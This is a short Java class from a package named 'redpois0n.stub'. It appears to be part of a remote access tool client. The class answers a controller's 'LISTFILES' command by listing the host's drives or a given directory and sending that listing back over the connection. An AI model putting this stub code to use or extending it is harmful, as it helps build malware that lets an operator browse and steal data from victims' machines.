package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet19ListFiles;

public class PacketLISTFILES extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String current = Connection.readLine();

		File[] files;

		if (current.length() == 0) {
			files = File.listRoots();
		} else {
			files = new File(current).listFiles();
		}

		Connection.addToSendQueue(new Packet19ListFiles(files));
	}

}
